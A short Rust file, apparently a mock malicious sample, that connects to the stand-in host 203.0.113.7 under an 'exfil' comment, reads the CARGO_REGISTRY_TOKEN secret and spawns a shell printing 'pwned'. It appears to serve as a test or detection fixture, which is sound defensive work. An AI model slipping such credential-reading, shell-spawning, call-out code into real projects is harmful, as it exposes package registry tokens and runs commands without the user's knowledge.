use std::env;
use std::net::TcpStream;
use std::process::Command;
fn main() {
    if let Ok(_s) = TcpStream::connect("203.0.113.7") { /* exfil */ }
    let _v = env::var("CARGO_REGISTRY_TOKEN").unwrap_or_default();
    Command::new("sh").arg("-c").arg("echo pwned").spawn().ok();
}
